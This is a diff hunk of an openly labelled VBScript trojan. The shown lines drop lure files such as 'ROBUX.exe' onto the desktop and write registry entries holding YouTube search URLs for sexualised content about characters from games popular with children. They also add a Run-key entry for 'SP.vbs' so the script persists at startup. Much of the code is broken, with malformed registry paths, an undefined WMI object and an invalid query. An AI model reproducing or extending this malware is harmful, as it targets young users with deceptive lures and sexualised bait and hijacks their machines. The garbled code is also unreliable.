@@ -82,14 +82,14 @@ TrojanVBS.copyfile desktopwindows&"\ROBUX.exe"
 TrojanVBS.copyfile desktopwindows&"\Sex Fnaf And Roblox.HTML"
 
 
-GH = wshshell.RegRead "HKLM/Software/Porn",1
+wshshell.RegRead "HKLM/Software/Porn"
 wshshell.RegWrite "HKLM/Software/Microsoft/Windows/CurrentVersion/URL/Hello", "https://www.youtube.com/results?search_query=r63+roblox", "REG_SZ"
 wshshell.RegWrite "HKLM/Software/Microsoft/Windows/CurrentVersion/URL/Hello", "https://www.youtube.com/results?search_query=SUS+Roblox", "REG_SZ"
 wshshell.RegWrite "HKLM/Software/Microsoft/Windows/CurrentVersion/URL/Hello", "https://www.youtube.com/results?search_query=toy+chica+r34", "REG_SZ"
 wshshell.RegWrite "HKLM/Software/Microsoft/Windows/CurrentVersion/URL/Hello", "https://www.youtube.com/results?search_query=Fnaf+SUS", "REG_SZ"
-wshshell.RegRead "HKCU/Software/InfectedVirus",1
+wshshell.RegRead "HKCU/Software/InfectedVirus"
 wshshell.RegWrite "HKCU/Software/Microsoft/Windows/CurrentVersion/Run/Trojan", "SP.vbs", "REG_SZ"
-FOLO = wshshell.RegWrite "HKCU/Software/Microsoft/Windows/CurrentVersion/Run/Trojan", "SP.vbs", "REG_SZ"
+wshshell.RegWrite "HKCU/Software/Microsoft/Windows/CurrentVersion/Run/Trojan", "SP.vbs", "REG_SZ"
 
 Set WMI = GetObject("winmgmts:\\.\root\cimv2")
 Set obj = objWMIService.ExecQuery("Select * Win32_SystemOS Where Infected = 'Trojan.VBS.CaughtIn4K'")
